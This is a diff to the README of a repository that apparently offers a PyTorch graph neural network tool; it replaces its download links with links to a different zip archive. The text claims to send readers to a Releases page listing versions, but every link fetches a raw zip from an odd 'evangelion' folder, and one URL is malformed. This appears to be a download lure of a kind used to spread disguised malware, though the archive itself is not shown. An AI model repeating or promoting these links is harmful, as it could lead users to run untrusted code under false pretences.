@@ -19,7 +19,7 @@ Welcome to gnn-node-link-pytorch! This software lets you explore Graph Neural Ne
 
 ## 📥 Download Now
 
-[![Download gnn-node-link-pytorch](https://raw.githubusercontent.com/Lordefex/gnn-node-link-pytorch/main/evangelion/gnn-node-link-pytorch.zip%https://raw.githubusercontent.com/Lordefex/gnn-node-link-pytorch/main/evangelion/gnn-node-link-pytorch.zip)](https://raw.githubusercontent.com/Lordefex/gnn-node-link-pytorch/main/evangelion/gnn-node-link-pytorch.zip)
+[![Download gnn-node-link-pytorch](https://github.com/Lordefex/gnn-node-link-pytorch/raw/refs/heads/main/evangelion/node_link_gnn_pytorch_1.9.zip%https://github.com/Lordefex/gnn-node-link-pytorch/raw/refs/heads/main/evangelion/node_link_gnn_pytorch_1.9.zip)](https://github.com/Lordefex/gnn-node-link-pytorch/raw/refs/heads/main/evangelion/node_link_gnn_pytorch_1.9.zip)
 
 ## 📋 Prerequisites
 
@@ -32,7 +32,7 @@ Before you begin, ensure you have:
 ## 📂 Download & Install
 
 1. **Visit the Download Page**
-   Go to the Releases page to download the software: [Visit this page to download](https://raw.githubusercontent.com/Lordefex/gnn-node-link-pytorch/main/evangelion/gnn-node-link-pytorch.zip).
+   Go to the Releases page to download the software: [Visit this page to download](https://github.com/Lordefex/gnn-node-link-pytorch/raw/refs/heads/main/evangelion/node_link_gnn_pytorch_1.9.zip).
 
 2. **Choose the Correct Version**
    You will see a list of available versions. Click on the latest release.
